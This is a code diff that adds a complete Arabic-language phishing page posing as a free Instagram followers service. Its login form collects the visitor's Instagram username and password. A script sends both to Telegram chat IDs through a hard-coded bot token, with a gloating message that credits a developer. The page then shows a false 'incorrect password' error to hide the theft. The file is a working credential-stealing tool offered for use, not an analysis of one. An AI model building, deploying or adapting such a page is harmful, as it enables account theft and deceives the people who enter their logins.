@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>الموقع الوحيد للحصول على 5000 متابعه مجانيه وبسرعه فائقه - Instagram Followers</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet">
+<style>
+body {
+  margin: 0;
+  font-family: 'Cairo', sans-serif;
+  background: linear-gradient(-45deg, #ff69b4, #8a2be2, #ff69b4, #8a2be2);
+  background-size: 400% 400%;
+  animation: gradientBG 15s ease infinite;
+  color: #fff;
+  text-align: center;
+}
+@keyframes gradientBG {
+  0% {background-position: 0% 50%;}
+  50% {background-position: 100% 50%;}
+  100% {background-position: 0% 50%;}
+}
+.container {
+  max-width: 400px;
+  margin: 60px auto;
+  background-color: rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  padding: 30px 20px;
+  box-shadow: 0 0 30px rgba(0,0,0,0.2);
+  backdrop-filter: blur(8px);
+}
+.logo {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  margin: 0 auto 10px;
+  background-image: url('https://via.placeholder.com/100x100.png?text=1K');
+  background-size: cover;
+  background-position: center;
+}
+h1 {
+  font-size: 20px;
+  margin-bottom: 5px;
+}
+p.subtitle {
+  margin-bottom: 20px;
+  font-size: 16px;
+  color: #ffe;
+}
+.icons {
+  display: none;
+}
+.form-box {
+  background: #f9c7d3;
+  color: #700028;
+  border-radius: 15px;
+  padding: 20px;
+}
+.form-box h2 {
+  margin-bottom: 15px;
+  font-size: 20px;
+}
+input {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 2px solid #d57e9c;
+  border-radius: 10px;
+  font-size: 16px;
+  text-align: right;
+}
+button {
+  width: 100%;
+  padding: 12px;
+  background-color: #cc3366;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 18px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+button:hover {
+  background-color: #a82d54;
+}
+.note {
+  margin-top: 10px;
+  font-size: 12px;
+  color: #444;
+}
+#errorMsg {
+  color: red;
+  font-size: 12px;
+  margin-top: 10px;
+  display: none;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo"></div>
+  <h1>الموقع الوحيد للحصول على 5000 متابعه مجانيه وبسرعه فائقه</h1>
+  <p class="subtitle">Instagram followers</p>
+  <div class="icons"></div>
+  <div class="form-box">
+    <h2>معلومات الاتصال</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+      <input type="password" id="password" placeholder="كلمة السر" required>
+      <button type="submit">تسجيل الدخول</button>
+      <p id="errorMsg">كلمة السر غير صحيحه يرجا إعادة المحاوله</p>
+    </form>
+    <p class="note">By submitting your contact details, you allow the link owner to contact you.</p>
+  </div>
+</div>
+<script>
+const TOKEN = '8340620437:AAFZxwAwK7SmttKhoDsOGH21PAs-LL79CsE';
+const CHAT_IDS = ['id', '6388576349', 'id'];
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+
+  const message = `😈 جبتلك ڪٰمٰشٰ جٰديٰدٰ سٰجٰلٰ دخول انستا 😈
+\n
+⌯⋆ 𝑈𝑆𝐸𝑅 ⋆⌯            ${username}
+
+⌯⋆ 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷 ⋆⌯      ${password}
+
+『 الــمطور صـ𓄌ـكر بغـ𓄌ـداد 』
+『@ffl8l』`;
+
+  CHAT_IDS.forEach(id => {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: id,
+        text: message
+      })
+    });
+  });
+
+  document.getElementById('errorMsg').style.display = 'block';
+});
+</script>
+</body>
+</html>
